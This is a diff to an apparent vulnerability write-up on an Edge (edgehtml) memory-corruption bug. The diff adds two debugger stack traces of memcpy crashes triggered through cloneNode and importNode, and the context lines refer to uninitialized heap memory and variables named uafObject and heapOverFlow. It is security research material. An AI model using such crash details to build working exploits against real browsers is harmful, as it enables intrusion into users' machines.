@@ -18,6 +18,37 @@ var a2 = a1.cloneNode();                                                        
 2 -> can be any variable, but if not set then the content provider will not crash.<br>
 3 -> leads to use of uninitialized heap memory.<br><br>
 
+minimal stack trace:<br>
+
+```c
+partial stack trace:
+
+ # Child-SP          RetAddr           Call Site
+00 00000050`e6bf6208 00007fff`7bccb940 msvcrt!memcpy+0x2e6
+01 00000050`e6bf6210 00007fff`51b5a895 msvcrt!memcpy_s+0x60
+02 00000050`e6bf6250 00007fff`51f5ea51 edgehtml!CStr::Set+0xa5
+03 00000050`e6bf6290 00007fff`51ebac70 edgehtml!CGeneratedContentExpression::Copy+0x35
+04 00000050`e6bf62d0 00007fff`51ca2b59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x2180fc
+05 00000050`e6bf6340 00007fff`51aa0c3e edgehtml!Tree::SpecifiedStyle::Clone+0x49
+06 00000050`e6bf6370 00007fff`51be1872 edgehtml!CAttrValue::InitVariant+0x19e
+07 00000050`e6bf63b0 00007fff`51be16d1 edgehtml!CAttrValue::Copy+0x66
+08 00000050`e6bf6400 00007fff`51be1562 edgehtml!CAttrArray::Clone+0xf1
+09 00000050`e6bf6480 00007fff`517df15e edgehtml!CElement::CloneAttributes+0x42
+0a 00000050`e6bf64b0 00007fff`51c81ffe edgehtml!CSVGElement::CloneAttributes+0x1e
+0b 00000050`e6bf6530 00007fff`51c62160 edgehtml!CElement::Clone+0x1de
+0c 00000050`e6bf66f0 00007fff`51a87787 edgehtml!Tree::TreeWriter::CloneNode+0x80
+0d 00000050`e6bf6730 00007fff`519cd476 edgehtml!CElement::CloneNodeHelper+0xa7
+0e 00000050`e6bf6760 00007fff`519cd3ed edgehtml!CDOMNode::Var_cloneNode+0x5a
+0f 00000050`e6bf6790 00007fff`51d11b45 edgehtml!CFastDOM::CNode::Trampoline_cloneNode+0x91
+10 00000050`e6bf67f0 00007fff`511ee581 edgehtml!CFastDOM::CNode::Profiler_cloneNode+0x25
+11 00000050`e6bf6820 00007fff`51226df6 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
+12 00000050`e6bf68f0 00007fff`510f942c chakra!amd64_CallFunction+0x86
+13 00000050`e6bf6940 00007fff`510fc368 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
+14 00000050`e6bf69a0 00007fff`51102c99 chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<1> > > >+0xe8
+15 00000050`e6bf69f0 00007fff`5110107c chakra!Js::InterpreterStackFrame::ProcessUnprofiledMediumLayoutPrefix+0x159
+16 00000050`e6bf6a50 00007fff`51100f08 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x8c
+```
+
 the crash was as follows:<br><br>
 
 ![](pics/curroption,,.PNG)
@@ -64,7 +95,29 @@ var heapOverFlow = document.importNode(uafObject,true);
 </body>
 ```
 
-
+```c
+ # Child-SP          RetAddr           Call Site
+00 0000001f`cbcfacb8 00007ffe`cec0b940 msvcrt!memcpy+0x2fa
+01 0000001f`cbcfacc0 00007ffe`a56ce525 msvcrt!memcpy_s+0x60
+02 0000001f`cbcfad00 00007ffe`a5b3e8b1 edgehtml!CStr::Set+0xa5
+03 0000001f`cbcfad40 00007ffe`a5a9ac92 edgehtml!CGeneratedContentExpression::Copy+0x35
+04 0000001f`cbcfad80 00007ffe`a5881d59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x218f1e
+05 0000001f`cbcfadf0 00007ffe`a567faae edgehtml!Tree::SpecifiedStyle::Clone+0x49
+06 0000001f`cbcfae20 00007ffe`a57c01a2 edgehtml!CAttrValue::InitVariant+0x19e
+07 0000001f`cbcfae60 00007ffe`a57c0001 edgehtml!CAttrValue::Copy+0x66
+08 0000001f`cbcfaeb0 00007ffe`a57bfe92 edgehtml!CAttrArray::Clone+0xf1
+09 0000001f`cbcfaf30 00007ffe`a5bc0bda edgehtml!CElement::CloneAttributes+0x42                            <-- CElement this time ..
+0a 0000001f`cbcfaf60 00007ffe`a58610be edgehtml!CCommentElement::CloneAttributes+0x1a
+0b 0000001f`cbcfaf90 00007ffe`a5840a00 edgehtml!CElement::Clone+0x1de
+0c 0000001f`cbcfb150 00007ffe`a58408d8 edgehtml!Tree::TreeWriter::CloneNode+0x80
+0d 0000001f`cbcfb190 00007ffe`a5667a5c edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
+0e 0000001f`cbcfb1e0 00007ffe`a5667be5 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x134
+0f 0000001f`cbcfb220 00007ffe`a5666518 edgehtml!Tree::TreeWriter::CloneTree+0x8d
+10 0000001f`cbcfb2a0 00007ffe`a5bcf929 edgehtml!CElement::CloneNodeHelper+0x58
+11 0000001f`cbcfb2d0 00007ffe`a5ca90d8 edgehtml!CDocument::importNode+0x89                                   <-- Our importNode.
+12 0000001f`cbcfb320 00007ffe`a58f8df5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc              (it's not a common api ..)
+13 0000001f`cbcfb3e0 00007ffe`ba7ab491 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25
+```
 
 here are some graphics for the reader:<br><br>
 
